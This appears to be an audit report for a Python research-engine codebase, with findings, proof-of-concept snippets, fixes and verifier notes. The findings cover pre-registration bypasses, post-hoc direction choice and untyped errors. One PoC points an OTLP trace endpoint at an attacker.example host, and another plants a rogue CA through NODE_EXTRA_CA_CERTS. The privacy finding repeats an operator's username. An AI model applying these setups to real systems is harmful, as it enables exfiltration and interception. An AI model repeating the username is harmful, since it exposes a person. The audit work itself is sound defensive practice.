findings.poc: In src/assay_engine/observability/tracing.py, delete the `if threading.current_thread() is threading.main_thread(): ... signal.signal(signal.SIGTERM, _handler)` block (lines 131-142), keeping `atexit.register(lambda: _safe(flush))`. `test_install_flush_on_exit_wires_atexit_and_sigterm` still passes: atexit handler registered and flush>=1; `captured` is empty so the `if "h" in captured` SIGTERM assertions are skipped.
findings.suggested_fix: Unconditionally require the SIGTERM handler in the main-thread case: since pytest runs the test body on the main thread, assert `"h" in captured` (handler installed) and then exercise it — `captured["h"](signal.SIGTERM, None); assert calls["shutdown"] >= 1`. Remove the `if "h" in captured:` guard so a reverted handler fails the test.

findings.title: Post-hoc direction selection (HARKing) for whole-corpus hypotheses locked with predicted_direction=None
findings.description: _resolve_direction accepts a confirm-time predicted_direction argument whenever the locked hypothesis has predicted_direction=None. Nothing forces a WHOLE_CORPUS hypothesis to carry a non-None predicted_direction at lock/pre-registration time: Hypothesis.__post_init__ explicitly allows None, canonical_hypothesis_digest binds None into the proof, and require_preregistered happily verifies a None-direction lock. The result: a study can pre-register a directionless whole-corpus hypothesis, look at the observed statistic / baseline, then choose 'greater' or 'less' at confirm_whole_corpus call time to land in whichever tail is significant. This is textbook HARKing — choosing the predicted tail after seeing the data — and it defeats the entire point of fixing direction at lock time (the issue #24 the docstring claims to have closed). The pre-registration cryptographic binding gives no protection because the thing that was locked is literally 'no direction'. Both the supported and contradicted verdicts hinge on this freely-chosen direction (direction vs opposite tail), so an analyst gets to pick the verdict's polarity post-hoc.
findings.poc:
from assay_engine.methodology.hypothesis import Hypothesis, HypothesisKind, HypothesisOrigin
from assay_engine.methodology.preregistration import LocalHmacAuthority, lock_hypothesis
from assay_engine.methodology.confirm import confirm_whole_corpus
auth = LocalHmacAuthority(b'x'*16)
h = Hypothesis('h1','effect exists', HypothesisKind.WHOLE_CORPUS, HypothesisOrigin.DISCOVERY, 'perm','beats null', predicted_direction=None)  # NO direction locked
h = lock_hypothesis(h, authority=auth)   # proof binds predicted_direction=None
null = [float(i) for i in range(100)]
obs = 95.0
# analyst now sees obs is high, picks 'greater' to get supported:
v1 = confirm_whole_corpus(h, observed=obs, null_distribution=null, alpha=0.05, resample_statistics=[95.0]*20, predicted_direction='greater', authority=auth)
# had obs been low, analyst would pick 'less' instead — verdict polarity chosen post-hoc
print(v1.label)  # supported, direction chosen AFTER seeing data, pre-registration intact
findings.suggested_fix: Require predicted_direction to be set at lock time for WHOLE_CORPUS hypotheses. Either (a) in Hypothesis.__post_init__ raise if kind is WHOLE_CORPUS and predicted_direction is None, or (b) in _resolve_direction / confirm_whole_corpus reject locked_dir is None unconditionally (do not let a confirm-time argument supply the direction for a pre-registered hypothesis) — accept the confirm-time argument only for an unlocked exploratory hypothesis, never for one going through require_preregistered. The directionless-deferred path must not be reachable for a pre-registered confirmatory test.

findings.title: Contradicted verdict is reported without any stability requirement, asymmetric with supported
findings.description: In confirm_whole_corpus a 'supported' verdict requires both significance in the predicted tail AND stability >= threshold across resamples (engine-measured). A 'contradicted' verdict, however, is returned as soon as p_contra <= alpha, before stability is even consulted, and stability is only ever measured in the predicted (support) tail — never in the opposite tail. Consequence: a single noisy observed statistic that happens to fall in the opposite tail of the null yields a hard 'contradicted' verdict with no reproducibility check at all, while the symmetric 'supported' claim is held to a stability bar. This asymmetry means contradictions of external claims (the §5 source-scoring path) can be driven by non-reproducible noise, biasing alignment_rate downward (every unstable opposite-tail blip counts as n_contradicted in SourceScorecard). The docstring frames this as intentional ('reportable without stability') but it is a real methodological inconsistency: the engine demands reproduction for one verdict polarity and not the other.
findings.poc:
# A null centered at 0; one observed draw lands in the opposite tail by chance.
# confirm_whole_corpus returns CONTRADICTED with notes='significant in the opposite tail'
# without ever measuring whether that contradiction reproduces across resamples,
# whereas the same magnitude in the supportive tail would be gated by stability_threshold.
# In adjudication this contradiction increments scorecard.n_contradicted and lowers
# alignment_rate on the strength of a single unreproduced statistic.
findings.suggested_fix: Apply the stability requirement symmetrically: measure stability in whichever tail the verdict is being asserted (compute a contra-tail stability when p_contra<=alpha) and require it to clear the threshold before returning 'contradicted'; if resamples are absent, return 'indeterminate (stability not assessed)' for the contradiction too, exactly as is done for support. Alternatively, document explicitly in METHODOLOGY.md why contradictions are deliberately held to a weaker bar and surface the missing-stability caveat in the verdict evidence so the scorecard consumer can discount it.

findings.title: Direct confirm primitives default to presence-only pre-registration gate (authority=None) — bypassable real-verification
findings.description: _gate_preregistration falls back to require_locked (a pure presence check on locked_at/timestamp_proof) when authority is None, and authority defaults to None on both confirm_unit_level and confirm_whole_corpus. These primitives are study-facing (the adjudication docstring instructs studies to call them inside their confirm callables). A study confirmer that calls confirm_whole_corpus/confirm_unit_level without threading the authority through gets only the sentinel check, which a hand-written timestamp_proof='x' satisfies — i.e. no content-binding, no timestamp attestation, no lock-before-confirm ordering. In the composed run_study pipeline the runner pre-verifies via require_preregistered, so this is defense-in-depth there; but any study (or test/fixture) that drives these primitives directly, or a future runner that forgets to pass authority, silently downgrades pre-registration to a no-op. A safe-by-default API should require the authority, not make real verification opt-in.
findings.poc:
from assay_engine.methodology.hypothesis import Hypothesis, HypothesisKind, HypothesisOrigin
from assay_engine.methodology.confirm import confirm_whole_corpus
from dataclasses import replace
h = Hypothesis('h','s',HypothesisKind.WHOLE_CORPUS,HypothesisOrigin.DISCOVERY,'t','r',predicted_direction='greater')
h = replace(h, locked_at='2020-01-01T00:00:00+00:00', timestamp_proof='not-a-real-proof')  # fake lock
# authority omitted -> only require_locked runs -> fake proof accepted
v = confirm_whole_corpus(h, observed=9.0, null_distribution=[0.0,1.0,2.0], alpha=0.1, resample_statistics=[9.0], stability_threshold=0.5)
print(v.label)  # produced a verdict on a hypothesis whose 'lock' was never cryptographically verified
findings.suggested_fix: Make authority a required keyword argument on confirm_unit_level and confirm_whole_corpus (no None default), so every confirmatory call performs full require_preregistered verification. If a deliberately unverified path must exist for exploratory use, gate it behind an explicit, loudly-named flag (e.g. verify_preregistration=False) rather than a silent None default, and forbid it for EXTERNAL_CLAIM/DISCOVERY origins.

findings.title: Unit-level confirm validates predicted_direction shape but never uses it, leaving direction_supports_claim fully unverified
findings.description: confirm_unit_level re-validates that hypothesis.predicted_direction (if present) is in {'greater','less'} as defense-in-depth, but the unit-level verdict is decided entirely by the trusted caller flag direction_supports_claim and never cross-checks it against the pre-registered predicted_direction. So a hypothesis can be locked with predicted_direction='greater' yet be confirmed 'supported' on the basis of direction_supports_claim=True even when the underlying held-out statistic actually points the other way — the engine binds a direction into the pre-registration proof and then ignores it at decision time. The validation at lines 162-168 gives a false sense that the locked direction governs the verdict; it does not. This is a smaller HARKing/consistency gap than M-1 (it requires a dishonest caller flag rather than free post-hoc choice) but the locked direction provides zero decision-time guarantee for the unit-level path.
findings.poc:
# Hypothesis locked predicted_direction='greater'.
# Caller passes direction_supports_claim=True with a statistic that is actually lower than baseline.
# verdict_from_pvalue returns SUPPORTED purely on the flag; the locked 'greater' is never consulted.
# The proof attests to a direction the verdict does not honor.
findings.suggested_fix: For the unit-level path, require the caller to pass the observed comparison sign and derive direction_supports_claim from it relative to the locked predicted_direction inside the engine (e.g. supports = (observed_relation == locked_direction)), rather than accepting a free boolean. At minimum, when predicted_direction is locked, validate that the recorded direction_supports_claim is consistent with caller-supplied directional evidence and record both in the verdict so a reviewer can detect a flag that contradicts the locked tail.

findings.title: Operator username PII survives transcript scrubbing outside /Users path context (committed provenance leak)
findings.description: The transcript scrubber's PII rule for the operator username only matches the username when it directly follows a home-path prefix: re.compile(r"(/(?:Users|home)/)[^/\s\"']+"). The committed transcripts embed the output of process/socket tools (lsof, ps) the agent ran, which print the username as a bare process-owner column (e.g. 'Claude 647 thomasjones 86u IPv4 ...'). That bare-username form is not preceded by '/Users/' or '/home/', so it is never redacted. The username 'thomasjones' appears 570 times in non-path contexts in the tracked file transcripts/sessions/8d54714a-...jsonl. This directly defeats the stated goal of #F-024 ('committing transcripts as provenance does not also publish the operator's identity') and the ADR-0003 data-sovereignty posture, since these transcripts are committed to a repo intended for public release. The same gap means any other PII surfaced by command output (not just home paths) is unredacted.
findings.poc: cd /Users/[REDACTED]/hc-assay && grep -oE '[A-Za-z]+ +[0-9]+ thomasjones' transcripts/sessions/*.jsonl | sort -u | head   # prints lsof/ps lines like 'ex 1546 thomasjones' that the scrubber left intact; git ls-files --error-unmatch on the .jsonl confirms it is tracked/committed.
findings.suggested_fix: Redact the operator username as a standalone token, not only after a path prefix. Derive the username from the source dir / Path.home() at runtime and add a word-boundary pattern for that literal username (re.compile(rf"\b{re.escape(user)}\b")) in addition to the path-prefix rule, so it is masked wherever it appears (process listings, git config, env dumps). Also re-run the scrubber over the already-committed transcripts and amend, since the leak is already in history.

findings.title: scrubbed_env() omits known off-box redirect env vars the Claude CLI/SDK honors (ANTHROPIC_API_URL / custom-header / extra-CA vectors)
findings.description: is_unsafe_subprocess_var() enumerates a fixed _UNSAFE_SUBPROCESS_VARS set plus shape rules (ANTHROPIC_*KEY/TOKEN, *_PROXY, AWS_*, GOOGLE_*). The metered/redirect shape rules are good, but the off-box-redirect set is a static allowlist of only three ANTHROPIC_*_BASE_URL names. Other documented redirect/transport-control variables the underlying node CLI / fetch stack honor are not covered, e.g. NODE_EXTRA_CA_CERTS and SSL_CERT_FILE (let an interceptor MITM egress and trust a rogue CA), and any future ANTHROPIC_* redirect that is neither a *_BASE_URL in the static set nor contains KEY/TOKEN (the docstring even claims the design is 'forward-proof' for credentials, but the off-box-redirect half is a static list, not shape-based). This is defense-in-depth: the loopback guard does not apply to the high-stakes tier (it is off-box by construction), so the env scrub is the only barrier for that subprocess.
findings.poc: Set NODE_EXTRA_CA_CERTS=/tmp/rogue.pem (or a future ANTHROPIC_* redirect var) before a HIGH_STAKES call; scrubbed_env() leaves it intact (only the 3 listed *_BASE_URL names, *_PROXY, AWS_/GOOGLE_, and KEY/TOKEN shapes are blanked), so the child trusts the attacker CA / honors the redirect.
findings.suggested_fix: Make the off-box-redirect coverage shape-based to match the credential half: blank any ANTHROPIC_* and CLAUDE_CODE_* var except the explicit allowlist (CLAUDE_CODE_OAUTH_TOKEN), and add NODE_EXTRA_CA_CERTS, SSL_CERT_FILE, SSL_CERT_DIR, REQUESTS_CA_BUNDLE, CURL_CA_BUNDLE to _UNSAFE_SUBPROCESS_VARS. Prefer an explicit allowlist for the subprocess env over a denylist for this trust boundary.

findings.title: OTLP exporter endpoint is not defended against OTEL_EXPORTER_OTLP_* env override (off-box span export)
findings.description: bootstrap_tracing() loopback-validates TRACING_HOST and passes an explicit endpoint= to phoenix.otel.register, which is good for the spans phoenix wires. However the process inherits any OTEL_EXPORTER_OTLP_ENDPOINT / OTEL_EXPORTER_OTLP_TRACES_ENDPOINT already set in the environment, and auto-instrumentation spans (LangChainInstrumentor, line 116) plus any third-party OTel SDK reading those standard env vars would export to that endpoint regardless of the loopback check applied only to TRACING_HOST. Spans carry prompt/purpose attributes derived from the data, so an inherited OTLP endpoint pointing off-box would ship trace content off the machine, contradicting ADR-0003. Unlike _local.py's positive loopback enforcement, nothing here neutralizes a hostile OTEL_EXPORTER_OTLP_* value.
findings.poc: export OTEL_EXPORTER_OTLP_TRACES_ENDPOINT=http://attacker.example:4318/v1/traces before running with the observability extra; spans emitted by the global SDK / auto-instrumentor can resolve this standard env var, exporting off-box even though ASSAY_TRACING_HOST is localhost.
findings.suggested_fix: In bootstrap_tracing(), before registering, either delete/override OTEL_EXPORTER_OTLP_ENDPOINT, OTEL_EXPORTER_OTLP_TRACES_ENDPOINT (and the protocol/headers variants) to the loopback collector value, or validate them through require_loopback_url and refuse to bootstrap on a non-loopback value. Treat these the same way scrubbed_env() treats redirect vars.

findings.title: discover_and_confirm does not type-guard the confirmer's return value (asymmetric with adjudication/pipeline)
findings.description: In adjudicate_with_baseline (adjudication.py:253) and the pipeline runner (pipeline.py:563) a confirmer that forgets to `return` (yields None) is caught with an explicit `if not isinstance(verdict, Verdict): raise FirewallViolation(...)` guard (pass-3 fix #F-021). The standalone discovery runner was left out: after `verdict = confirm(hypothesis, held_out)` at line 150 it goes straight to `verdict.hypothesis_id` at line 151. A confirmer returning None (or any non-Verdict) therefore raises an opaque `AttributeError: 'NoneType' object has no attribute 'hypothesis_id'` instead of the documented typed `FirewallViolation`. The module docstring (lines 94-97) explicitly promises 'Raises FirewallViolation ... a verdict↔hypothesis misattribution', and a None verdict never reaches that misattribution check. This breaks the typed-exception contract for one of the two public Firewall-B entry points while the other entry points uphold it.
findings.poc:
from assay_engine.methodology.discovery import discover_and_confirm
# confirm callable that forgets to return a Verdict (returns None)
def bad_confirm(hyp, held_out):
    pass  # returns None
# with a valid corpus/split/authority and a discover() that returns one locked DISCOVERY hypothesis:
# discover_and_confirm(corpus, split, discover=..., confirm=bad_confirm, authority=...)
# -> raises AttributeError("'NoneType' object has no attribute 'hypothesis_id'")
#    instead of FirewallViolation('confirm returned NoneType ... expected a Verdict')
findings.suggested_fix:
Mirror the adjudication/pipeline guard immediately after the confirm() call:
    verdict = confirm(hypothesis, held_out)
    if not isinstance(verdict, Verdict):
        raise FirewallViolation(
            f"confirm returned {type(verdict).__name__} for hypothesis "
            f"{hypothesis.hypothesis_id!r} — expected a Verdict")
Import Verdict is already present (line 39).

findings.title: from_records raises raw KeyError on a malformed record instead of the typed ProvenanceError
findings.description: from_records (line 260) rebuilds ProvenanceEntry objects by directly subscripting each record: r["seq"], r["kind"], r["summary"], r["payload"], r["timestamp"], r["prev_hash"], r["entry_hash"] (lines 267-275). A record deserialized from an external/persistent store that is missing any of these keys raises a bare KeyError, not the module's typed ProvenanceError. Every other deserialization/verification path in this module surfaces ProvenanceError (verify_records, _digest's RecursionError/Value/TypeError handling at lines 82-88, the clock/timestamp guards at 130-143, the freeze guard at 155-158). The provenance trail is explicitly a trust-boundary deserialization point ('rebuild entries from to_records output and verify the chain'), so an externally-supplied record that drops or renames a field should fail with the trail's typed error a caller can catch alongside verify_records failures, not a raw KeyError. Also a non-int seq / non-str field would propagate the downstream construction error untyped.
findings.poc:
from assay_engine.provenance import from_records
# a store dropped/renamed the 'entry_hash' field on one record
bad = [{"seq":0,"kind":"x","summary":"s","payload":{},"timestamp":"2020-01-01T00:00:00+00:00","prev_hash":"assay-provenance:v1:genesis"}]
from_records(bad)
# -> KeyError: 'entry_hash'   (expected: ProvenanceError describing the malformed record)
findings.suggested_fix:
Wrap the entry construction in from_records in a try/except that raises ProvenanceError, e.g.:
    try:
        entries = tuple(ProvenanceEntry(seq=r["seq"], kind=r["kind"], ...) for r in records)
    except (KeyError, TypeError, ValueError) as exc:
        raise ProvenanceError(f"provenance record could not be rebuilt: {exc}") from None
    verify_records(entries, secret=secret)
(verify_records then still enforces chain integrity on the typed-good entries.)

findings.title: Gate.evaluate accesses decision.approved without confirming the precondition returned a GateDecision
findings.description: Gate.evaluate calls the study-supplied precondition at line 87 (`decision = self.precondition(context)`) and then immediately reads `decision.approved` at line 88 and `decision.reason` at line 89. precondition is a Callable on the adapter trust boundary; a study that returns a bool, None, or any non-GateDecision (an easy mistake — returning `True` instead of GateDecision.approved(...)) triggers an opaque AttributeError ('bool' object has no attribute 'approved') rather than the module's typed GateError. This is the same contract-asymmetry class that pass 3 closed for confirmer returns (#F-021) but left open for gate preconditions. The module's stated guarantee is that 'a transition is legal only if the gate returns an approved decision' and GateError is the documented failure type.
findings.poc:
from assay_engine.orchestration.gates import Gate
from assay_engine.orchestration.phases import Phase
g = Gate(name="g", frm=Phase.BASELINE, to=Phase.REPORT, precondition=lambda ctx: True)  # returns bool, not GateDecision
g.evaluate({})
# -> AttributeError: 'bool' object has no attribute 'approved'  (expected GateError)
findings.suggested_fix:
Validate the precondition's return immediately after calling it:
    decision = self.precondition(context)
    if not isinstance(decision, GateDecision):
        raise GateError(f"gate {self.name!r} precondition returned {type(decision).__name__}, expected GateDecision")
Optionally also wrap the call itself to normalize a raising precondition into GateError.

findings.title: build_baseline_artifact lets hash_value raise raw ValueError/TypeError on non-finite or unhashable extra_inputs
findings.description: At line 140, `input_hashes[name] = hash_value(value)` is called for every extra_input. hash_value -> canonical_json uses allow_nan=False and canonical_plain refuses non-JSON-native leaves, so an extra_input containing a NaN/Inf float raises a bare ValueError ('Out of range float values are not JSON compliant') and an unhashable/uncanonicalizable leaf raises a bare TypeError. preregistration.canonical_hypothesis_digest (preregistration.py:120-127) deliberately catches exactly these and re-raises a typed, contextual PreRegistrationError that names the offending input. build_baseline_artifact — the other public consumer of the same canonical hashing — does not, so the determinism harness surfaces a low-context raw exception that does not identify which extra_input was bad. Not a documented 'Raises' contract today, but the inconsistency makes a reproducibility-harness misuse hard to diagnose.
findings.poc:
from assay_engine.baseline.determinism import build_baseline_artifact
# corpus is any valid Corpus, contents={} 
build_baseline_artifact(corpus, {}, extra_inputs={"cfg": {"thr": float('nan')}})
# -> ValueError: Out of range float values are not JSON compliant
#    (no indication that extra_input 'cfg' is the culprit)

findings.title: make_gate_node re-raises a recorder failure after the interrupt resume was already consumed, the same 'stranded resume' bricking it guards against elsewhere
findings.description: In the gate node's resume loop, once apply_gate_decision validates a resume value the node calls recorder(rec) at line 145 inside the still-open `while True` loop, then returns. interrupt() at line 137 has already consumed and persisted the operator's resume value into the checkpoint before validation. If recorder raises (e.g. the bound trail's clock raises, the payload is unserializable, or the provenance lock is contended — all real failure modes the trail itself converts to ProvenanceError), the exception propagates out of node(). The module's own design rationale (docstring lines 16-21 and inline comment lines 133-135) is that a raise after the resume is consumed strands the value in the checkpoint and replays it forever, bricking the gate — which is precisely why a BAD resume re-fires interrupt instead of raising. A recorder failure on a GOOD resume hits exactly that hazard: the validated decision is lost, and on replay the node re-fires interrupt (already_decided is False because the recorder never wrote the terminal record), re-prompting the operator while the prior valid resume index is gone.
findings.poc:
from assay_engine.orchestration.gatenode import make_gate_node
from assay_engine.orchestration.gates import Gate
# recorder that fails (e.g. trail clock down / lock contended)
def flaky_recorder(rec):
    raise RuntimeError("provenance trail unavailable")
node = make_gate_node(gate, propose=lambda s: {}, recorder=flaky_recorder)
# operator submits a valid 'approved' resume; recorder raises -> exception escapes node();
# the approved resume was already persisted by interrupt() and is now lost on replay.
findings.suggested_fix: Make the recorder call inside the loop resilient like the rest of the resume protocol: either (a) attempt-record-then-return, normalizing a recorder failure into a re-fired interrupt carrying the error so the operator can re-submit, or (b) record best-effort with a structured warning (mirroring pipeline.py:738-747 'never mask / never strand') so a transient trail failure does not lose an already-consumed valid decision. Do not let a recorder exception escape after interrupt() has consumed the resume value.

result.reasoning: Confirmed against the actual code. The docstring at src/assay_engine/baseline/primitives.py:125 states the determinism freeze keeps an array "opaque/O(1), unlike a nested list." The only freeze path for an array-like object is src/assay_engine/_frozen.py:109-118, which unconditionally calls value.tobytes() (line 118) and wraps the result in a (kind, shape, bytes) descriptor that is re-frozen. tobytes() allocates and copies every byte (n*itemsize), making the operation O(N) in both time and memory; there is no reference-only or constant-time branch. A 10M-element array materializes a 10M*itemsize-byte bytes object on every freeze. The intended contrast (a single tobytes() call vs. recursing element-by-element through Python-level freeze() for a nested list, which carries per-element object overhead) is genuinely real, but it does not make the literal "O(1)" claim correct — both forms are O(N), with the array form merely having a lower constant factor. I could not find any code path that makes the freeze of an array constant-time, so the documentation-accuracy finding withstands disproof.

Confirmed by reading the actual code. tracing.py:131-141 only calls signal.signal (the mocked setattr at test_observability.py:179-181 that populates captured["h"]) when running on the main thread. The test asserts the SIGTERM behavior (shutdown >= 1) only inside `if "h" in captured:` at line 188. captured["h"] exists *solely* as a side effect of the source calling signal.signal. Under the PoC revert (delete lines 131-142, keep atexit.register at line 130), signal.signal is never invoked, captured stays empty, the `if "h" in captured` branch is skipped, and the remaining assertions (line 185 atexit non-empty, line 187 flush>=1) still pass because atexit.register is untouched. I grepped tests/ for SIGTERM/signal.signal/getsignal coverage: this is the only test touching the SIGTERM path, so nothing else catches the revert. The SIGTERM half of the regression guard is therefore vacuous on exactly the revert it claims to detect. The fix is to make the SIGTERM assertion unconditional (e.g. `assert "h" in captured` before invoking it), since the test runs on pytest's main thread where the handler must be installed.

Refuted. The double-release the finding describes is unreachable, and the comment's idempotency guarantee holds for every input the function can actually receive.

(1) Every future that reaches _release originates from _pool.submit(fn) at seam.py:229, where _pool is a stdlib concurrent.futures.ThreadPoolExecutor (line 187, imported line 35). The two and only call sites — add_done_callback(_release) at line 246 and the explicit _release(future) at line 248 — both operate on that same stdlib Future. stdlib Future has no __slots__ and freely accepts arbitrary instance attributes, so the assignment future._assay_released = True at line 208 cannot raise AttributeError/TypeError. The except branch at line 209 is genuinely dead code, correctly marked `# pragma: no cover - Future allows attrs; defensive`.

(2) The PoC requires passing a future-like object with __slots__ (no _assay_released slot) or an assignment-blocking property to _release. No code path — public or internal — injects such an object; _release is only ever called with a stdlib Future. The finding itself concedes this is 'currently unreachable' and rates it low.

(3) On the residual 'comment overstates the guarantee' claim: the comment at line 209 explicitly documents that the assignment cannot fail for the actual type ('Future allows attrs') and that the except is purely 'defensive'. The 'released exactly once either way' / '_release runs at most once' claims therefore hold unconditionally over the entire realized domain of inputs. A guarantee that holds for every input a function can actually receive is, contractually, an unconditional guarantee; the only counterexample is an object the codebase cannot construct. There is no test, contract, or PoC demonstrating an actual _inflight over-release. This is a documentation nuance about provably-dead defensive code, not a defect.

Confirmed against src/assay_engine/reasoning/seam.py:149-180. is_unsafe_subprocess_var() matches only: ANTHROPIC_*KEY/TOKEN shape (is_metered_anthropic_credential), the static 7-name _UNSAFE_SUBPROCESS_VARS set, *_PROXY suffix, and AWS_/GOOGLE_ prefixes. NODE_EXTRA_CA_CERTS and SSL_CERT_FILE match none of these rules, so scrubbed_env() leaves them intact in the dict handed to ClaudeAgentOptions(env=...). The subprocess env is {**os.environ, **scrubbed_env()}, so these vars reach the Node-based claude CLI child unchanged. NODE_EXTRA_CA_CERTS is a documented Node.js variable that appends a CA to the trust store (the CLI is a Node binary, its fetch/TLS honors it); SSL_CERT_FILE is honored by OpenSSL stacks — either lets an on-box attacker make the off-box high-stakes subprocess trust a rogue CA and MITM egress. No additional barrier neutralizes this: the loopback guard (require_loopback_url) applies only to the BULK tier (high-stakes is off-box by construction), and the sandbox flags (allowed_tools=[], setting_sources=[], permission_mode='dontAsk') do not affect transport/CA env vars. grep over the entire repo finds zero references to NODE_EXTRA_CA_CERTS/SSL_CERT_FILE/CA_CERT, and the integration test test_t3_wires_scrubbed_env_into_subprocess_options only asserts ANTHROPIC_API_KEY and ANTHROPIC_BASE_URL are blanked — it never exercises these vectors. The finding's core asymmetry is verified: the credential half is shape-based ('forward-proof') but the off-box-redirect/transport half is a static allowlist, so redirect/CA-trust vectors outside that list pass through. Could not disprove; the PoC is concrete and accurate.

Verified by executing the exact PoC. The test at tests/test_baseline.py:237 (test_cosine_matrix_scale_uses_fast_path) asserts only: len(m)==300, len(m[0])==300, m[0][0]==approx(1.0), and elapsed<2.0. The first three are path-independent (both _cosine_matrix_pure and _cosine_matrix_numpy produce a 300x300 matrix with unit diagonal). The only fast-path-discriminating assertion is the 2.0s wall-clock budget.

Measured empirically (.venv Python 3.14): _cosine_matrix_pure on the test's 300x64 matrix completes in ~0.083s — ~24x under the threshold. I then applied the PoC directly: edited cosine_similarity_matrix (src/assay_engine/baseline/primitives.py:149-155) to delete the numpy dispatch branch and unconditionally `return _cosine_matrix_pure(rows)`. With that regression in place, `pytest tests/test_baseline.py::test_cosine_matrix_scale_uses_fast_path` PASSED (1 passed in 0.10s). I restored the original file afterward.

The test therefore does not guard the fix it names; the 2.0s budget is far too loose to detect the pure O(n^2*d) path at this corpus size. Finding survives.

Confirmed, not refutable. The scrubber rule at scripts/capture_transcripts.py:51 is `re.compile(r"(/(?:Users|home)/)[^/\s\"']+")`, which only redacts the username when slash-prefixed by /Users/ or /home/[REDACTED] I verified the scrubber DID run on the committed file (7297 `/Users/[REDACTED] substitutions, 0 raw `/Users/[REDACTED] remaining), yet the bare username `thomasjones` survives 572 times in non-path contexts: PoC `grep -oE '[A-Za-z]+ +[0-9]+ thomasjones'` yields lsof/ps owner columns like `ex 1546 thomasjones` and `Claude 647 thomasjones`; additionally the dash-encoded Claude project slug `-Users-thomasjones-hc-grc` (500 hits, no slash before the name so the regex misses it) and `pytest-of-thomasjones`. The file transcripts/sessions/8d54714a-d616-4911-a386-9b4b0f2ce74d.jsonl is git-tracked (`git ls-files --error-unmatch` succeeds) and not gitignored (`git check-ignore` exit 1). No CI/release gate excludes transcripts/ from the public repo — the wheel-exclusion only covers packaging, and the README's mitigation (`git rm -r --cached transcripts/`) is a manual step not yet applied. This defeats the stated #F-024 goal ('committing transcripts as provenance does not also publish the operator's identity') because the redaction is anchored to a path prefix while the username leaks in every non-path surface. The README only acknowledges residual filesystem paths and email, treating the username-in-path scrub as sufficient for identity — so the gap is real and unmitigated.

Confirmed and could not be refuted. Code at src/assay_engine/_frozen.py:142-158 matches the finding exactly: the docstring (line 146) promises 'frozenset -> sorted list (stable order for reproducible output)' and the inline comment (line 154) claims 'keep insertion-free stable repr', but the except-TypeError fallback (line 158) iterates the frozenset directly via [unfreeze(v) for v in value], which is hash-ordered and NOT stable.

Empirically reproduced both PoCs on the actual module (Python 3.9.6, loaded directly to bypass the slots import issue):
- frozenset(['alpha',1,'beta',2,'gamma']) yields three distinct orderings across PYTHONHASHSEED 0/1/2: [1,2,'gamma','beta','alpha'], [1,2,'alpha','gamma','beta'], [1,2,'gamma','alpha','beta'].
- A frozenset of FrozenDicts (sorted() raises TypeError, so it hits the fallback) likewise reorders across seeds: e.g. seed0 [{'b':2},{'a':1},{'c':3}] vs seed3 [{'a':1},{'b':2},{'c':3}].

The non-determinism leaks into reproducibility-critical output: unfreeze is the documented thaw for GateReview.payload (pipeline.py:107, payload_dict) and for provenance records (provenance.py:227, to_records). json.dumps(sort_keys=True) sorts dict KEYS only, not LIST elements, so once a frozenset is thawed to a list the unstable element order survives into serialized JSON bytes and into the provenance/entry records that exist to be byte-for-byte re-checkable.

Decisive corroboration: the project's own canonical serializer src/assay_engine/_canonical.py:51 solves precisely this case with sorted((...), key=repr) and refuses non-reproducible leaves LOUDLY (lines 59-64). The authors knew the correct deterministic technique and applied it where digests are enforced, but unfreeze's fallback omits it — confirming the docstring/comment assert a property the code does not deliver (F-032 class). The fix is to apply the same sorted(key=repr) fallback in unfreeze.

No constraint guarantees frozenset payload elements are mutually orderable: frozenset fields in contracts (study.py modes, firewalls.py id sets, schema unit_ids) happen to be homogeneous str/enum today, but unfreeze is a generic public thaw with no type guard, and FrozenDict-valued frozensets are explicitly reachable (the docstring itself cites deep-frozen payloads). No test asserts deterministic order for the fallback path.

Verified against /Users/[REDACTED]/hc-assay/src/assay_engine/persistence/checkpoint.py. The finding holds.

1. _CONN_INIT_LOCKS (line 85) and _POOLS_BY_CONN (line 89) are module-level dicts that are only ever written via assignment: _CONN_INIT_LOCKS[conn_str] = Lock() (line 193) and _POOLS_BY_CONN[conn_str] = pool (line 298). There is no del/pop/clear, no max-size, no LRU, no eviction in production code. A repo-wide grep finds clear()/monkeypatch only in tests (tests/test_persistence.py:430-431, tests/integration/test_persistence_live.py:159-160), confirming no production pruning.

2. No key canonicalization defeats the PoC. get_postgres_connection_string() (line 154) returns os.environ['ASSAY_POSTGRES_URL'] passed through require_local_uri(), and require_local_uri (src/assay_engine/_local.py:142) returns the uri string VERBATIM on success — no normalization. So distinct DSN strings (e.g. PoC's appended ?application_name=run_i, sslmode toggles, rotated userinfo) each become a distinct dict key, creating a new entry per distinct string.

3. Each distinct conn_str builds a fresh ConnectionPool(..., open=True) (lines 266-278) with a background worker thread, registered for atexit-only cleanup (_register_pool_cleanup, _OPEN_POOLS) and cached in _POOLS_BY_CONN — so the worker-thread/connection count climbs by one per distinct DSN and none are reclaimed until interpreter exit.

4. Credential rotation creates a new conn_str (changed userinfo) → new pool; the old pool stays in _OPEN_POOLS/_POOLS_BY_CONN, never reused and never closed until exit (orphan leak), exactly as described.

The only removal path (lines 311-315) fires only on init FAILURE and removes from _OPEN_POOLS alone, not from the two add-only dicts — irrelevant to the success-path leak in the PoC.

The code's own comment (line 84) concedes this is only 'harmless' for a fixed single-DB deployment; the finding is explicitly scoped to long-lived multi-DSN / multi-tenant / credential-rotation workloads, for which the unbounded cache and pool/thread leak are real. I could not disprove it.

REFUTED. The PoC is unreachable in any real code path. _submit_bounded(fn) takes a callable, not a future; the future is always created internally by the module-level stdlib ThreadPoolExecutor via _pool.submit(fn) (seam.py:229). A caller cannot inject a future, and the code never subclasses/wraps Future, so the runtime type is always a real concurrent.futures.Future. The finding itself concedes that real Future allows arbitrary attribute assignment — so future._assay_released=True succeeds (seam.py:208), the guard getattr(future,'_assay_released',False) (line 205) flips True, and _release is genuinely idempotent; no double-decrement of _inflight occurs in production. Triggering the swallowed AttributeError branch requires a slotted Future-like double with no _assay_released slot, but (a) no such slotted Future subclass exists anywhere in src/ (only an unrelated _frozen.py dataclass uses __slots__), and (b) the only way to substitute such an object is to monkeypatch _pool.submit in a test — a self-contradictory, test-only artifact with no real-world counterpart. The existing test that exercises the exact double-release window (tests/test_persistence.py:737) uses a plain non-slotted _Fut double on which assignment succeeds and asserts _inflight stays 0 (not -1) after both the explicit fallback _release and the later callback fire.
